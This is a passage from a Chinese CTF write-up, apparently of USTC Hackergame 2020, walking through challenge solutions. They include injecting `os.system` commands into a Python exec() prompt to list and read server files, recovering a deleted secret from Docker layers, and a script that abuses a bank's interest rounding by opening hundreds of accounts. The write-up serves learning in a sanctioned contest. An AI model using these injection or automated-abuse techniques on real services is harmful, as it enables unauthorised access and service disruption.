src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 